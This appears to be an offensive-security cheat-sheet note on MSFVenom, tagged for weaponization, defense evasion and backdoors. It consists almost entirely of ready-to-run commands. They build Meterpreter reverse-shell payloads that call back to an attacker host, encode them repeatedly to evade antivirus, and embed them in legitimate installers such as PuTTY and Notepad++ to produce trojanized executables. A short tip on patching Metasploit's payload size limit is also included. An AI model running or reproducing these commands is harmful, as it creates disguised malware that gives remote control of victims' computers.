---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - defense-evasion
  - backdoor
  - metasploit-framework
---
# MSFVenom


> [!INFO] Error Message
> To remove the message `Error: The EXE generator now has a max size of 2048 bytes, please fix the calling module`. Modify a specific ruby script (`/opt/metasploit-framework/embedded/framework/lib/msf/util/exe.rb`) by increasing the size limit from `2048` to `204800` to fix it.

```
$ msfvenom -a x64 --platform windows -p generic/custom PAYLOADFILE=calc.exe -f vba-exe
```


```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> exitfunc=thread prependmigrate=true prependmigrateproc=<process.exe> -e x64/xor_dynamic -i 10 -k -x putty_x64.exe -o backdoored_putty_x64.exe
```

Embed a legitimate program into a trojan horse

```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.105 lport=443 -e x86/shikata_ga_nai -i 10 -f raw > payload.bin

$ msfvenom -a x86 --platform windows -p generic/custom payloadfile=payload.bin exitfunc=thread prependmigrate=true prependmigrateproc=<process.exe> -e x86/bloxor -i 5 -x npp.8.1.7.Installer.exe -k -f exe -o notepad-plus-plus.Installer.exe
```

---
## References

### Source Repositories

- [RoseSecurity: Bypass AV Payload Detection](https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.md)

- [Backdooring Putty](https://fluidattacks.com/blog/backdooring-putty/)

- [Patching Windows Executable with the Backdoor](https://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory)